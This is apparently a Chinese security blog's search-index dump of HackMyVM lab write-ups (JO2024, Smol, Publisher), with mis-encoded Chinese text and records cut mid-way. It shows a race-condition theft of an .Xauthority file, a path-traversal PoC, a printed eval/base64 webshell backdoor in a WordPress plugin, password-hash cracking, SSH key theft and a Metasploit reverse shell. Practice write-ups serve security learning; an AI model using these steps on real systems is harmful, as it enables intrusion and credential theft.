åœ¨å¤åˆ¶è¿‡ç¨‹ä¸­ï¼Œæ ¡éªŒæ–‡ä»¶çš„å®Œæ•´æ€§ï¼Œå¹¶è®¾ç½®ç›®æ ‡æ–‡ä»¶çš„æƒé™ä¸º 700ã€‚ å¦‚æœæ–‡ä»¶å¤åˆ¶åæ ¡éªŒå¤±è´¥ï¼Œè¾“å‡ºé”™è¯¯ä¿¡æ¯ã€‚ æ¼æ´ç‚¹åº”è¯¥æ˜¯åœ¨äºddå‘½ä»¤ï¼Œddå¤åˆ¶æ–‡ä»¶æ—¶ä¸ä¼šä¿ç•™åŸå§‹æ–‡ä»¶çš„æƒé™ï¼Œè€Œæ˜¯ä½¿ç”¨ç›®æ ‡æ–‡ä»¶çš„é»˜è®¤æƒé™ï¼Œå¹¶ä¸”å¯ä»¥æ˜¯çœ‹åˆ°æ˜¯åœ¨å¤åˆ¶å®Œæ¯•åå†ä½¿ç”¨chmod 700 \"$destfile\"å»è®¾ç½®æƒé™ æˆ‘ä»¬ç›®çš„æ˜¯è¯»å–æ–‡ä»¶ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨æ¡ä»¶ç«äº‰åœ¨å®ƒä¿®æ”¹æ–‡ä»¶æƒé™å‰è¯»åˆ°æ–‡ä»¶ www-data@jo2024:/$ while true; do cat /backup/.Xauthority \u003e\u003e /tmp/log 2\u003e/dev/null;sleep 0.01; done \u003cXauthority \u003e\u003e /tmp/log 2\u003e/dev/null;sleep 0.01; done çœ‹çœ‹log www-data@jo2024:/$ cat /tmp/log cat /tmp/log debian11MIT-MAGIC-COOKIE-1\u003e7 EXJ[fdebian0MIT-MAGIC-COOKIE-1mlJ jo2024.hmv0MIT-MAGIC-COOKIE-1A6\u0026Xj*Zdebian11MIT-MAGIC-COOKIE-1\u003e7 åˆ©ç”¨ .Xauthorityï¼Œåœ¨https://book.hacktricks.wiki/en/network-services-pentesting/6000-pentesting-x11.html#screenshots-capturing www-data@jo2024:/$ w 14:03:43 up 4:43, 1 user, load average: 0.44, 0.29, 0.14 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT vanity tty7 :0 09:20 4:43m 0.00s 0.07s /usr/bin/lxsession -s LXDE -e LXDE export XAUTHORITY=/tmp/log xwd -root -screen -silent -display :0 \u003e screenshot.xwd python3 -m http.server 2131(ä¼ åˆ°kali) convert screenshot.xwd screenshot.png å¾—åˆ°è´¦å·å¯†ç vanity/xd0oITR93KIQDbiDï¼Œé‚£ä¹ˆsshä¸Šå» vanity@MiWiFi-R4CM-srv:~$ sudo -l sudo: unable to resolve host MiWiFi-R4CM-srv: No address associated with hostname Matching Defaults entries for vanity on MiWiFi-R4CM-srv: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty User vanity may run the following commands on MiWiFi-R4CM-srv: (ALL : ALL) NOPASSWD: /usr/local/bin/php-server.sh vanity@MiWiFi-R4CM-srv:~$ cat /usr/local/bin/php-server.sh #!/bin/bash /usr/bin/php -t /opt -S 0.0.0.0:8000 å¥½åƒæ˜¯èµ·äº†ä¸€ä¸ªæœåŠ¡ï¼Œå¯åŠ¨è®¿é—®ä¸€ä¸‹ Olympic Athlete Password Leaked! A hacker claims to have obtained the password of a famous Olympic athlete. According to the hacker, he managed to hack into the personal account of the famous sprinter, Usain Bolt! The hacker has provided what he claims to be Usain Bolt's account password as proof of his achievement. For security reasons and to protect the athlete's privacy, the content below is blurred and requires a subscription to be revealed. å¥¥è¿ä¼šè¿åŠ¨å‘˜å¯†ç æ³„æ¼äº†ï¼ ä¸€ä½é»‘å®¢å£°ç§°å·²ç»è·å¾—äº†è‘—åå¥¥è¿ä¼šè¿åŠ¨å‘˜çš„å¯†ç ã€‚æ ¹æ®é»‘å®¢çš„è¯´æ³•ï¼Œä»–è®¾æ³•é—¯å…¥äº†è‘—åçš„çŸ­è·‘è¿åŠ¨å‘˜Usain Boltçš„ä¸ªäººå¸æˆ·ï¼ é»‘å®¢æä¾›äº†ä»–å£°ç§°æ˜¯Usain Boltçš„å¸æˆ·å¯†ç çš„è¯æ˜ï¼Œä»¥è¯æ˜ä»–çš„æˆå°±ã€‚å‡ºäºå®‰å…¨åŸå› å¹¶ä¿æŠ¤è¿åŠ¨å‘˜çš„éšç§ï¼Œä¸‹é¢çš„å†…å®¹æ¨¡ç³Šä¸æ¸…ï¼Œéœ€è¦è®¢é˜…ä»¥æ­ç¤ºã€‚ f12çœ‹çœ‹éšè—çš„éƒ¨åˆ† data-content=\"As part o","date":"2025-03-07","objectID":"/hmv_jo2024/:1:4","tags":["æ¸—é€"],"title":"HMV JO2024","uri":"/hmv_jo2024/"},{"categories":["é¶åœº"],"content":"Smol ","date":"2025-03-07","objectID":"/hmv_smol/:1:0","tags":["æ¸—é€"],"title":"HMV Smol","uri":"/hmv_smol/"},{"categories":["é¶åœº"],"content":"é¶åœºé“¾æ¥ https://hackmyvm.eu/machines/machine.php?vm=Smol ","date":"2025-03-07","objectID":"/hmv_smol/:1:1","tags":["æ¸—é€"],"title":"HMV Smol","uri":"/hmv_smol/"},{"categories":["é¶åœº"],"content":"æ—¥å¸¸æ‰«æ â”Œâ”€â”€(parallelsã‰¿kali-linux-2024-2)-[~] â””â”€$ nmap -sC -sV 192.168.31.25 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-06 20:18 CST Nmap scan report for 192.168.31.25 Host is up (0.0023s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA) | 256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA) |_ 256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Did not follow redirect to http://www.smol.hmv Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 7.60 seconds è®¾ç½®ä¸€ä¸‹é‡å®šå‘ï¼Œæœ€ä¸‹é¢æœ‰Proudly powered by WordPress | PopularFX Theme wpscanå¯åŠ¨ï¼ â”Œâ”€â”€(parallelsã‰¿kali-linux-2024-2)-[~] â””â”€$ wpscan --url http://www.smol.hmv/ -e u,ap --plugins-detection aggressive _______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ Â® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | '_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.25 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________ [+] URL: http://www.smol.hmv/ [192.168.31.25] [+] Started: Thu Mar 6 20:26:25 2025 Interesting Finding(s): [+] Headers | Interesting Entry: Server: Apache/2.4.41 (Ubuntu) | Found By: Headers (Passive Detection) | Confidence: 100% [+] XML-RPC seems to be enabled: http://www.smol.hmv/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/ [+] WordPress readme found: http://www.smol.hmv/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] Upload directory has listing enabled: http://www.smol.hmv/wp-content/uploads/ | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] The external WP-Cron seems to be enabled: http://www.smol.hmv/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos | - https://github.com/wpscanteam/wpscan/issues/1299 [i] The WordPress version could not be detected. [+] WordPress theme in use: popularfx | Location: http://www.smol.hmv/wp-content/themes/popularfx/ | Last Updated: 2024-11-19T00:00:00.000Z | Readme: http://www.smol.hmv/wp-content/themes/popularfx/readme.txt | [!] The version is out of date, the latest version is 1.2.6 | Style URL: http://www.smol.hmv/wp-content/themes/popularfx/style.css?ver=1.2.5 | Style Name: PopularFX | Style URI: https://popularfx.com | Description: Lightweight theme to make beautiful websites with Pagelayer. Includes 100s of pre-made templates to ... | Author: Pagelayer | Author URI: https://pagelayer.com | | Found By: Css Style In Homepage (Passive Detection) | | Version: 1.2.5 (80% confidence) | Found By: Style (Passive Detection) | - http://www.smol.hmv/wp-content/themes/popularfx/style.css?ver=1.2.5, Match: 'Version: 1.2.5' [+] Checking Plugin Versions (via Passive and Aggressive Methods) [i] Plugin(s) Identified: [+] akismet | Location: http://www.smol.hmv/wp-content/plugins/akismet/ | Last Updated: 2025-02-14T18:49:00.000Z | Readme: http://www.smol.hmv/wp-c","date":"2025-03-07","objectID":"/hmv_smol/:1:2","tags":["æ¸—é€"],"title":"HMV Smol","uri":"/hmv_smol/"},{"categories":["é¶åœº"],"content":"å¼¹shell é¢ï¼Œå‘ç°è¿™ä¸ªç”¨æˆ·æƒé™å¾ˆä½ï¼ˆwpç‰ˆæœ¬å¥½ä½ï¼Œçœ‹çš„ä¸ä¹ æƒ¯éƒ½ï¼‰ï¼Œæ’ä»¶ä¸èƒ½ç¼–è¾‘ä¸Šä¼ ï¼Œä¸»é¢˜æºç ä¸èƒ½ä¿®æ”¹ï¼Œå®Œå•¦ çœ‹é‡Œé¢çš„å†…å®¹å‘ç°Webmaster Tasks!!æœ‰ä¸€å¥è¯[IMPORTANT] Check Backdoors: Verify the SOURCE CODE of \"Hello Dolly\" plugin as the site's code revision.ï¼Œå¼€æ‰« â”Œâ”€â”€(parallelsã‰¿kali-linux-2024-2)-[~] â””â”€$ dirsearch -u \"http://www.smol.hmv/\" -x 403 -e php,zip,txt /usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html from pkg_resources import DistributionNotFound, VersionConflict _|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| ) Extensions: php, zip, txt | HTTP method: GET | Threads: 25 Wordlist size: 10439 Output File: /home/parallels/reports/http_www.smol.hmv/__25-03-06_20-43-25.txt Target: http://www.smol.hmv/ [20:43:25] Starting: [20:43:37] 301 - 0B - /index.php -\u003e http://www.smol.hmv/ [20:43:37] 200 - 7KB - /license.txt [20:43:37] 404 - 19KB - /index.php/login/ [20:43:42] 200 - 3KB - /readme.html [20:43:47] 301 - 315B - /wp-admin -\u003e http://www.smol.hmv/wp-admin/ [20:43:47] 301 - 317B - /wp-content -\u003e http://www.smol.hmv/wp-content/ [20:43:47] 200 - 0B - /wp-content/ [20:43:47] 200 - 84B - /wp-content/plugins/akismet/akismet.php [20:43:47] 500 - 0B - /wp-content/plugins/hello.php [20:43:47] 200 - 519B - /wp-content/uploads/ [20:43:47] 200 - 414B - /wp-content/upgrade/ [20:43:47] 301 - 318B - /wp-includes -\u003e http://www.smol.hmv/wp-includes/ [20:43:47] 200 - 0B - /wp-includes/rss-functions.php [20:43:48] 400 - 1B - /wp-admin/admin-ajax.php [20:43:48] 200 - 0B - /wp-cron.php [20:43:48] 409 - 3KB - /wp-admin/setup-config.php [20:43:48] 200 - 4KB - /wp-includes/ [20:43:48] 200 - 0B - /wp-config.php [20:43:48] 302 - 0B - /wp-admin/ -\u003e http://www.smol.hmv/wp-login.php?redirect_to=http%3A%2F%2Fwww.smol.hmv%2Fwp-admin%2F\u0026reauth=1 [20:43:48] 200 - 511B - /wp-admin/install.php [20:43:48] 302 - 0B - /wp-signup.php -\u003e http://www.smol.hmv/wp-login.php?action=register [20:43:48] 405 - 42B - /xmlrpc.php [20:43:48] 200 - 2KB - /wp-login.php Task Completed å†ç”¨ä¸€ä¸‹poc /wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true\u0026call=getRawDataFromDatabase\u0026query=php://filter/resource=../../../../wp-content/plugins/hello.php è¯»å–åˆ° \u003c?php /** * @package Hello_Dolly * @version 1.7.2 */ /* Plugin Name: Hello Dolly Plugin URI: http://wordpress.org/plugins/hello-dolly/ Description: This is not just a plugin, it symbolizes the hope and enthusiasm of an entire generation summed up in two words sung most famously by Louis Armstrong: Hello, Dolly. When activated you will randomly see a lyric from \u003ccite\u003eHello, Dolly\u003c/cite\u003e in the upper right of your admin screen on every page. Author: Matt Mullenweg Version: 1.7.2 Author URI: http://ma.tt/ */ function hello_dolly_get_lyric() { /** These are the lyrics to Hello Dolly */ $lyrics = \"Hello, Dolly Well, hello, Dolly It's so nice to have you back where you belong You're lookin' swell, Dolly I can tell, Dolly You're still glowin', you're still crowin' You're still goin' strong I feel the room swayin' While the band's playin' One of our old favorite songs from way back when So, take her wrap, fellas Dolly, never go away again Hello, Dolly Well, hello, Dolly It's so nice to have you back where you belong You're lookin' swell, Dolly I can tell, Dolly You're still glowin', you're still crowin' You're still goin' strong I feel the room swayin' While the band's playin' One of our old favorite songs from way back when So, golly, gee, fellas Have a little faith in me, fellas Dolly, never go away Promise, you'll never go away Dolly'll never go away again\"; // Here we split it into lines. $lyrics = explode( \"\\n\", $lyrics ); // And then randomly choose a line. return wptexturize( $lyrics[ mt_rand( 0, count( $lyrics ) - 1 ) ] ); } // This just echoes the chosen line, we'll position it later. function hello_dolly() { eval(base64_decode('CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA=')); $chosen = hello_dolly_get_lyric(); $lang = ''; if ( 'e","date":"2025-03-07","objectID":"/hmv_smol/:1:3","tags":["æ¸—é€"],"title":"HMV Smol","uri":"/hmv_smol/"},{"categories":["é¶åœº"],"content":"ææƒ è¿›æ•°æ®åº“æŸ¥è¡¨ mysql\u003e select * from wp_users; select * from wp_users; +----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+---------------------+-------------+------------------------+ | ID | user_login | user_pass | user_nicename | user_email | user_url | user_registered | user_activation_key | user_status | display_name | +----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+---------------------+-------------+------------------------+ | 1 | admin | $P$B5Te3OJvzvJ7NjDDeHZcOKqsQACvOJ0 | admin | admin@smol.thm | http://www.smol.hmv | 2023-08-16 06:58:30 | | 0 | admin | | 2 | wpuser | $P$BfZjtJpXL9gBwzNjLMTnTvBVh2Z1/E. | wp | wp@smol.thm | http://smol.thm | 2023-08-16 11:04:07 | | 0 | wordpress user | | 3 | think | $P$B0jO/cdGOCZhlAJfPSqV2gVi2pb7Vd/ | think | josemlwdf@smol.thm | http://smol.thm | 2023-08-16 15:01:02 | | 0 | Jose Mario Llado Marti | | 4 | gege | $P$BsIY1w5krnhP3WvURMts0/M4FwiG0m1 | gege | gege@smol.thm | http://smol.thm | 2023-08-17 20:18:50 | | 0 | gege | | 5 | diego | $P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1 | diego | diego@smol.thm | http://smol.thm | 2023-08-17 20:19:15 | | 0 | diego | | 6 | xavi | $P$BvcalhsCfVILp2SgttADny40mqJZCN/ | xavi | xavi@smol.thm | http://smol.thm | 2023-08-17 20:20:01 | | 0 | xavi | +----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+---------------------+-------------+------------------------+ 6 rows in set (0.00 sec) å¼€çˆ†å¯†ç  john --wordlist=/usr/share/wordlists/rockyou.txt hash Using default input encoding: UTF-8 Loaded 6 password hashes with 6 different salts (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3]) Cost 1 (iteration count) is 8192 for all loaded hashes Will run 8 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status sandiegocalifornia (?) suåˆ‡æ¢ç”¨æˆ· diego@smol:/home$ cd think cd think diego@smol:/home/think$ ls ls diego@smol:/home/think$ ls -la ls -la total 32 drwxr-x--- 5 think internal 4096 Jan 12 2024 . drwxr-xr-x 6 root root 4096 Aug 16 2023 .. lrwxrwxrwx 1 root root 9 Jun 21 2023 .bash_history -\u003e /dev/null -rw-r--r-- 1 think think 220 Jun 2 2023 .bash_logout -rw-r--r-- 1 think think 3771 Jun 2 2023 .bashrc drwx------ 2 think think 4096 Jan 12 2024 .cache drwx------ 3 think think 4096 Aug 18 2023 .gnupg -rw-r--r-- 1 think think 807 Jun 2 2023 .profile drwxr-xr-x 2 think think 4096 Jun 21 2023 .ssh lrwxrwxrwx 1 root root 9 Aug 18 2023 .viminfo -\u003e /dev/null åˆ«çš„è´¦æˆ·è¿˜æœ‰æ„å¤–ä¹‹å–œå“ï¼Œ diego@smol:/home/think/.ssh$ python3 -m http.server 8001 â”Œâ”€â”€(parallelsã‰¿kali-linux-2024-2)-[~/Desktop] â””â”€$ wget 192.168.31.25:8001/id_rsa --2025-03-06 21:35:09-- http://192.168.31.25:8001/id_rsa Connecting to 192.168.31.25:8001... connected. HTTP request sent, awaiting response... 200 OK Length: 2602 (2.5K) [application/octet-stream] Saving to: â€˜id_rsaâ€™ id_rsa 100%[================\u003e] 2.54K --.-KB/s in 0.002s 2025-03-06 21:35:09 (1.39 MB/s) - â€˜id_rsaâ€™ saved [2602/2602] â”Œâ”€â”€(parallelsã‰¿kali-linux-2024-2)-[~/Desktop] â””â”€$ chmod 600 id_rsa â”Œâ”€â”€(parallelsã‰¿kali-linux-2024-2)-[~/Desktop] â””â”€$ ssh think@192.168.31.25 -i id_rsa Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-156-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Thu 06 Mar 2025 01:36:43 PM UTC System load: 1.46 Processes: 209 Usage of /: 56.1% of 9.75GB Users logged in: 0 Memory usage: 35% IPv4 address for enp0s17: 192.168.31.25 Swap usage: 0% Expanded Security Maintenance for Applications is not enabled. 162 updates can be applied immediately. 125 of these updates are standard security updates. To see these additional updates run: apt list --upgradable Enable ESM Apps to receive additional future security updates. See https://ubuntu.com/esm or run: sudo pro status The list of availab","date":"2025-03-07","objectID":"/hmv_smol/:1:4","tags":["æ¸—é€"],"title":"HMV Smol","uri":"/hmv_smol/"},{"categories":["é¶åœº"],"content":"publisher ","date":"2025-03-05","objectID":"/hmv_publisher/:1:0","tags":["æ¸—é€"],"title":"HMV publisher","uri":"/hmv_publisher/"},{"categories":["é¶åœº"],"content":"é¶åœºé“¾æ¥ https://hackmyvm.eu/machines/machine.php?vm=Publisher ","date":"2025-03-05","objectID":"/hmv_publisher/:1:1","tags":["æ¸—é€"],"title":"HMV publisher","uri":"/hmv_publisher/"},{"categories":["é¶åœº"],"content":"æ—¥å¸¸æ‰«æ ipç»™äº†æ˜¯ . . . 8 â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ nmap -sV -sC -T4 -Pn -p- 192.168.31.8 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-04 20:46 HKT Nmap scan report for 192.168.31.8 Host is up (0.0017s latency). Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA) | 256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA) |_ 256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Publisher's Pulse: SPIP Insights \u0026 Tips MAC Address: 08:00:27:E4:F1:F5 (Oracle VirtualBox virtual NIC) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 15.56 seconds dirbå’Œdirsearchéƒ½æ‰«ä¸å‡ºæ¥ä»€ä¹ˆä¸œè¥¿ï¼Œæ¢gobusterè¯•è¯• â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ gobuster dir -u http://192.168.31.8/ -w /usr/share/wordlists/dirb/big.txt -x php,html,txt,md -b 404 =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://192.168.31.8/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/big.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Extensions: php,html,txt,md [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /.htpasswd (Status: 403) [Size: 277] /.htaccess.md (Status: 403) [Size: 277] /.htaccess.php (Status: 403) [Size: 277] /.htaccess.html (Status: 403) [Size: 277] /.htpasswd.md (Status: 403) [Size: 277] /.htaccess.txt (Status: 403) [Size: 277] /.htpasswd.php (Status: 403) [Size: 277] /.htpasswd.txt (Status: 403) [Size: 277] /.htpasswd.html (Status: 403) [Size: 277] /.htaccess (Status: 403) [Size: 277] /images (Status: 301) [Size: 313] [--\u003e http://192.168.31.8/images/] /index.html (Status: 200) [Size: 8686] /server-status (Status: 403) [Size: 277] /spip (Status: 301) [Size: 311] [--\u003e http://192.168.31.8/spip/] Progress: 102345 / 102350 (100.00%) =============================================================== Finished =============================================================== å¥½ä¸œè¥¿ï¼Œæ€ªä¸å¾—é‚£ä¹ˆå¤šä½¬å–œæ¬¢è¿™ä¸ªï¼Œspipå¥½åƒæœ‰ä¸€å †æ¼æ´ï¼Œçœ‹çœ‹ç‰ˆæœ¬ â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ whatweb http://192.168.31.8/spip/ http://192.168.31.8/spip/ [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[192.168.31.8], MetaGenerator[SPIP 4.2.0], SPIP[4.2.0][http://192.168.31.8/spip/local/config.txt], Script[text/javascript], Title[Publisher], UncommonHeaders[composed-by,link,x-spip-cache] æ‰¾ä¸€ä¸‹ â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ searchsploit SPIP 4.2.0 ---------------------------------------------- --------------------------------- Exploit Title | Path ---------------------------------------------- --------------------------------- SPIP v4.2.0 - Remote Code Execution (Unauthen | php/webapps/51536.py ---------------------------------------------- --------------------------------- Shellcodes: No Results ","date":"2025-03-05","objectID":"/hmv_publisher/:1:2","tags":["æ¸—é€"],"title":"HMV publisher","uri":"/hmv_publisher/"},{"categories":["é¶åœº"],"content":"æ¼æ´åˆ©ç”¨ è„šæœ¬æŠ¥é”™ï¼Œä¸çŸ¥é“ä¸ºå•¥ï¼Œmsfå¯åŠ¨ msf6 \u003e search SPIP 4.2.0 [-] No results from search msf6 \u003e search SPIP 4.2 Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/multi/http/spip_bigup_unauth_rce 2024-09-06 excellent Yes SPIP BigUp Plugin Unauthenticated RCE 1 \\_ target: PHP In-Memory . . . . 2 \\_ target: Unix/Linux Command Shell . . . . 3 \\_ target: Windows Command Shell . . . . 4 exploit/multi/http/spip_porte_plume_previsu_rce 2024-08-16 excellent Yes SPIP Unauthenticated RCE via porte_plume Plugin 5 \\_ target: PHP In-Memory . . . . 6 \\_ target: Unix/Linux Command Shell . . . . 7 \\_ target: Windows Command Shell . . . . 8 exploit/multi/http/spip_rce_form 2023-02-27 excellent Yes SPIP form PHP Injection 9 \\_ target: PHP In-Memory . . . . 10 \\_ target: Unix/Linux Command Shell . . . . 11 \\_ target: Windows Command Shell . . . . Interact with a module by name or index. For example info 11, use 11 or use exploit/multi/http/spip_rce_form After interacting with a module you can manually set a TARGET with set TARGET 'Windows Command Shell' msf6 \u003e use 0 [*] No payload configured, defaulting to php/meterpreter/reverse_tcp msf6 exploit(multi/http/spip_bigup_unauth_rce) \u003e show options Module options (exploit/multi/http/spip_bigup_unauth_rce): Name Current Setting Required Description ---- --------------- -------- ----------- FORM_PAGE Auto yes A page with a form. Proxies no A proxy chain of format type:host:por t[,type:host:port][...] RHOSTS yes The target host(s), see https://docs. metasploit.com/docs/using-metasploit/ basics/using-metasploit.html RPORT 80 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connec tions TARGETURI / yes Path to Spip install VHOST no HTTP server virtual host Payload options (php/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 192.168.31.183 yes The listen address (an interface may be s pecified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 PHP In-Memory View the full module info with the info, or info -d command. msf6 exploit(multi/http/spip_bigup_unauth_rce) \u003e set RHOSTS http://192.168.31.8/spip/ RHOSTS =\u003e http://192.168.31.8/spip/ msf6 exploit(multi/http/spip_bigup_unauth_rce) \u003e run [*] Started reverse TCP handler on 192.168.31.183:4444 [*] Running automatic check (\"set AutoCheck false\" to disable) [*] SPIP Version detected: 4.2.0 [+] SPIP version 4.2.0 is vulnerable. [*] Bigup plugin version detected: 3.2.1 [+] The target appears to be vulnerable. Both the detected SPIP version (4.2.0) and bigup version (3.2.1) are vulnerable. [*] Found formulaire_action: login [*] Found formulaire_action_args: CKNCtMYqq36vgfpnNEIK0... [*] Preparing to send exploit payload to the target... [*] Sending stage (40004 bytes) to 192.168.31.8 [*] Meterpreter session 1 opened (192.168.31.183:4444 -\u003e 192.168.31.8:47312) at 2025-03-04 21:11:27 +0800 meterpreter \u003e shell Process 60 created. Channel 0 created. id uid=33(www-data) gid=33(www-data) groups=33(www-data) è¿™ç©æ„çœŸå¥½ç”¨å•Šæˆ‘é ï¼Œç¬¬ä¸€ä¸ªflagå¯ä»¥ç›´æ¥æ‹¿åˆ°çš„ ","date":"2025-03-05","objectID":"/hmv_publisher/:1:3","tags":["æ¸—é€"],"title":"HMV publisher","uri":"/hmv_publisher/"},{"categories":["é¶åœº"],"content":"ææƒ ls -la total 48 drwxr-xr-x 8 think think 4096 Feb 10 2024 . drwxr-xr-x 1 root root 4096 Dec 7 2023 .. lrwxrwxrwx 1 root root 9 Jun 21 2023 .bash_history -\u003e /dev/null -rw-r--r-- 1 think think 220 Nov 14 2023 .bash_logout -rw-r--r-- 1 think think 3771 Nov 14 2023 .bashrc drwx------ 2 think think 4096 Nov 14 2023 .cache drwx------ 3 think think 4096 Dec 8 2023 .config drwx------ 3 think think 4096 Feb 10 2024 .gnupg drwxrwxr-x 3 think think 4096 Jan 10 2024 .local -rw-r--r-- 1 think think 807 Nov 14 2023 .profile lrwxrwxrwx 1 think think 9 Feb 10 2024 .python_history -\u003e /dev/null drwxr-xr-x 2 think think 4096 Jan 10 2024 .ssh lrwxrwxrwx 1 think think 9 Feb 10 2024 .viminfo -\u003e /dev/null drwxr-x--- 5 www-data www-data 4096 Dec 20 2023 spip -rw-r--r-- 1 root root 35 Feb 10 2024 user.txt .sshå¯ä»¥è¯»ï¼Œè¯»å¯†é’¥sshä¸Šå» ä¿¡æ¯æ”¶é›†ä¸€ä¸‹ think@publisher:~$ find / -perm -u=s -type f 2\u003e/dev/null /usr/lib/policykit-1/polkit-agent-helper-1 /usr/lib/openssh/ssh-keysign /usr/lib/eject/dmcrypt-get-device /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/xorg/Xorg.wrap /usr/sbin/pppd /usr/sbin/run_container /usr/bin/at /usr/bin/fusermount /usr/bin/gpasswd /usr/bin/chfn /usr/bin/sudo /usr/bin/chsh /usr/bin/passwd /usr/bin/mount /usr/bin/su /usr/bin/newgrp /usr/bin/pkexec /usr/bin/umount /usr/sbin/run_containerè¿™ç©æ„æœ‰æƒé™çš„ï¼Œçœ‹çœ‹æ˜¯ä»€ä¹ˆï¼Œcatæœ‰ä¹±ç ï¼Œstringsçœ‹çœ‹ think@publisher:~$ strings /usr/sbin/run_container /lib64/ld-linux-x86-64.so.2 libc.so.6 __stack_chk_fail execve __cxa_finalize __libc_start_main GLIBC_2.2.5 GLIBC_2.4 _ITM_deregisterTMCloneTable __gmon_start__ _ITM_registerTMCloneTable u+UH []A\\A]A^A_ /bin/bash /opt/run_container.sh :*3$\" GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0 crtstuff.c deregister_tm_clones __do_global_dtors_aux completed.8061 __do_global_dtors_aux_fini_array_entry frame_dummy __frame_dummy_init_array_entry run_container.c __FRAME_END__ __init_array_end _DYNAMIC __init_array_start __GNU_EH_FRAME_HDR _GLOBAL_OFFSET_TABLE_ __libc_csu_fini _ITM_deregisterTMCloneTable _edata __stack_chk_fail@@GLIBC_2.4 __libc_start_main@@GLIBC_2.2.5 execve@@GLIBC_2.2.5 __data_start __gmon_start__ __dso_handle _IO_stdin_used __libc_csu_init __bss_start main __TMC_END__ _ITM_registerTMCloneTable __cxa_finalize@@GLIBC_2.2.5 .symtab .strtab .shstrtab .interp .note.gnu.property .note.gnu.build-id 